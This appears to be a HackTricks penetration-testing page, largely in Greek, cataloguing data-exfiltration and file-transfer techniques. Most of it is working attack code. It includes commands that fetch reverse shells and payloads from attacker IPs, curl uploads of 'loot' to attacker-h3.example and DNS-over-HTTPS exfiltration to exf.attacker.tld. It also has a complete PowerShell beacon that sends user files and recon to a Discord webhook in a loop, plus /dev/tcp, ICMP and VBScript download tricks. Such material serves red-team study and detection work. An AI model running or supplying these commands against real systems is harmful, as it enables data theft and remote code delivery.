# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Για ένα end-to-end παράδειγμα staging του loot στο `C:\Users\Public` και exfiltration του με Rclone, ώστε να μιμείται legitimate backups, δείτε το παρακάτω workflow.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Συνηθισμένα whitelisted domains για exfiltration πληροφοριών

Ελέγξτε το [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνηθισμένα whitelisted domains που μπορούν να γίνουν abuse

## Copy\&Paste Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Μεταφόρτωση αρχείων

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer με εκτύπωση των GET και POST (καθώς και των headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python module [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Διακομιστής HTTPS**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

Αν τα egress controls είναι ρυθμισμένα για επιθεώρηση του κλασικού **TCP/443**, αλλά είναι permissive με το **UDP/443**, η επιβολή του **HTTP/3** μπορεί να μεταφέρει τη μεταφορά στο **QUIC** αντί για TLS-over-TCP. Το attacker endpoint χρειάζεται native υποστήριξη **HTTP/3** (για παράδειγμα, έναν reverse proxy ή upload endpoint που ήδη διαφημίζει `Alt-Svc: h3`).
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
Μια ερευνητική εργασία του 2025 (QUIC-Exfil) έδειξε ότι χαρακτηριστικά του QUIC, όπως οι κρυπτογραφημένες κεφαλίδες και η μετεγκατάσταση σύνδεσης, μπορούν να κάνουν τον εντοπισμό exfiltration σε επίπεδο firewall δυσκολότερο από ό,τι στα κλασικά κανάλια που βασίζονται σε TLS ή DNS, επομένως αναμένεται ότι αυτός ο τομέας θα αποκτήσει μεγαλύτερη σημασία καθώς εξαπλώνεται η υποστήριξη του HTTP/3.<sup>[[9]](#references)</sup>

### Pre-signed / delegated uploads σε object-storage

Όταν μπορείτε να δημιουργήσετε ή να αποκτήσετε ένα βραχύβιο **signed URL**, το θύμα χρειάζεται μόνο έναν κανονικό client HTTPS. Αυτό αποφεύγει την εγκατάσταση cloud SDK ή τη χρήση διαπιστευτηρίων μεγάλης διάρκειας στον host και ενσωματώνεται στην κοινή κίνηση object-storage.

**Linux / macOS (AWS S3 pre-signed `PUT`)**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 pre-signed `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
Σημειώσεις:
- Τα Pre-signed URLs / SAS tokens συνήθως περιορίζουν το **path**, τη **HTTP method** και τη **λήξη**.
- Για το Azure Blob `Put Blob`, το `x-ms-blob-type: BlockBlob` είναι υποχρεωτικό.
- Αυτό το pattern λειτουργεί καλά με `curl`, `Invoke-WebRequest` ή οποιοδήποτε custom implant μπορεί να εκτελέσει ένα raw HTTPS `PUT`.<sup>[[8]](#references)</sup>

### goshs

Το [goshs](https://github.com/patrickhener/goshs) είναι μια single-binary αντικατάσταση του `python3 -m http.server`<sup>[[4]](#references)</sup>
με upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
και OOB collaboration features (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## Webhooks (Discord/Slack/Teams) για C2 & Data Exfiltration

Τα Webhooks είναι HTTPS endpoints μόνο για εγγραφή, τα οποία δέχονται JSON και προαιρετικά τμήματα αρχείων. Συνήθως επιτρέπονται προς trusted SaaS domains και δεν απαιτούν OAuth/API keys, γεγονός που τα καθιστά χρήσιμα για low-friction beaconing και exfiltration.<sup>[[5]](#references)[[6]](#references)</sup>

Βασικές ιδέες:
- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data με ένα part που ονομάζεται payload_json και περιέχει {"content":"..."} και προαιρετικά file part(s) που ονομάζονται file.
- Μοτίβο operator loop: περιοδικό beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK επιβεβαιώνουν την παράδοση.

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
Σημειώσεις:
- Παρόμοια μοτίβα ισχύουν και για άλλες collaboration platforms (Slack/Teams) που χρησιμοποιούν τα incoming webhooks τους· προσαρμόστε το URL και το JSON schema ανάλογα.
- Για DFIR των Discord Desktop cache artifacts και την ανάκτηση webhook/API, δείτε:<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (cloud/object-storage exfiltration)

Οι σύγχρονοι operators συχνά **προετοιμάζουν το loot τοπικά** και στη συνέχεια χρησιμοποιούν το [Rclone](https://rclone.org/) ώστε η μεταφορά να μοιάζει με μια κανονική εργασία backup ή sync. Ένα πρακτικό μοτίβο είναι:

1. Ένα κανονικό remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. Ένα wrapper `crypt`, ώστε **τα περιεχόμενα και τα filenames να κρυπτογραφούνται client-side**
3. Ένα προαιρετικό wrapper `chunker`, αν ο provider επιβάλλει όρια μεγέθους αντικειμένων ή θέλετε μικρότερες μονάδες upload
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
Σημειώσεις:
- Το `crypt` μπορεί να κρυπτογραφεί τόσο τα περιεχόμενα όσο και τα ονόματα των αρχείων.<sup>[[3]](#references)</sup>
- Το `chunker` διαχωρίζει διαφανώς τα μεγάλα αρχεία και τα επανασυναρμολογεί κατά το download.
- Το `rclone.conf` αποθηκεύει τα secrets του `crypt` σε **obscured** μορφή, όχι ως ισχυρή προστασία δεδομένων σε κατάσταση αδράνειας. Για βραχύχρονες λειτουργίες, προτιμήστε ένα αποκλειστικό προσωρινό config και διαγράψτε το μετά. Αν πρέπει να το διατηρήσετε για περισσότερο, προτιμήστε κρυπτογραφημένο χειρισμό του config (`RCLONE_CONFIG_PASS` / `--password-command`) αντί να αφήνετε ένα απλό `rclone.conf` στον δίσκο.
- Αν ο στόχος συγχρονίζει ήδη **OneDrive**, **Google Drive** ή **Dropbox**, η αντιγραφή του loot στον συγχρονισμένο κατάλογο μπορεί να αξιοποιήσει έναν ήδη εγκεκριμένο client, αντί να εγκαταστήσετε νέο transfer binary.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP διακομιστής (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP server (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** client
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali ως server
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ή δημιουργήστε ένα smb share **χρησιμοποιώντας το samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
Το [goshs](https://github.com/patrickhener/goshs) είναι μια εναλλακτική λύση με ένα μόνο binary<sup>[[4]](#references)</sup>
που κάνει serve αρχεία μέσω SMB και συλλέγει hashes NetNTLMv2 από clients που συνδέονται:
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

Ο attacker πρέπει να έχει το SSHd σε λειτουργία.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Εάν το θύμα έχει SSH, ο attacker μπορεί να κάνει mount έναν κατάλογο από το θύμα στον attacker.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Λήψη αρχείου από το victim
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Μεταφόρτωση αρχείου στο θύμα
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
χάρη στο **@BinaryShadow_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS over HTTPS (DoH)

Αν το κλασικό UDP/53 DNS είναι noisy ή blocked, αλλά το εξερχόμενο HTTPS επιτρέπεται ευρέως, το συνηθισμένο μοτίβο DNS-label exfiltration μπορεί να ενσωματωθεί σε αιτήματα **DoH** προς έναν public resolver. Διατηρήστε κάθε label αρκετά κάτω από το όριο των 63 byte του DNS και χρησιμοποιήστε ένα DNS-safe alphabet, όπως το Base32.
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
Στον authoritative DNS server για το `exf.attacker.tld`, ταξινομήστε τα queries σύμφωνα με το αριθμητικό πρόθεμα και ανακατασκευάστε το Base32 stream. Έτσι, η μεταφορά παραμένει μέσα στο HTTPS προς τον resolver, αντί για το κλασικό UDP/53 DNS.<sup>[[2]](#references)</sup>

Για πλήρη bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, κ.λπ.), δείτε [τη σελίδα tunneling](tunneling-and-port-forwarding.md).

## **SMTP**

Αν μπορείτε να στείλετε δεδομένα σε έναν SMTP server, μπορείτε να δημιουργήσετε έναν SMTP για να λαμβάνετε τα δεδομένα με python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

Το [goshs](https://github.com/patrickhener/goshs) μπορεί να εκκινήσει γρήγορα έναν SMTP server<sup>[[4]](#references)</sup>
για να καταγράφει email callbacks κατά τη διάρκεια σεναρίων OOB exfiltration:
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
Τα ληφθέντα emails και callbacks εμφανίζονται απευθείας στην έξοδο του terminal.  
Μπορεί να συνδυαστεί με τον DNS callback server για πλήρη κάλυψη OOB:
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

Από προεπιλογή στα XP και 2003 (σε άλλα χρειάζεται να προστεθεί ρητά κατά την εγκατάσταση)

Στο Kali, **εκκινήστε τον διακομιστή TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP server σε python:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Στο **victim**, συνδεθείτε στον Kali server:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Κατεβάστε ένα αρχείο με ένα PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Θύμα**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση binaries, αλλά έχει επίσης τη **δυνατότητα ανακατασκευής τους από hex**. Αυτό σημαίνει ότι, παρέχοντας το hex ενός binary, το `debug.exe` μπορεί να δημιουργήσει το αρχείο binary. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει **περιορισμό στη συναρμολόγηση αρχείων μεγέθους έως 64 kb**.<sup>[[1]](#references)</sup>
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Στη συνέχεια, αντιγράψτε και επικολλήστε το κείμενο στο windows-shell και θα δημιουργηθεί ένα αρχείο με το όνομα nc.exe.

## Αναφορές

- [1] [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)

{{#include ../banners/hacktricks-training.md}}
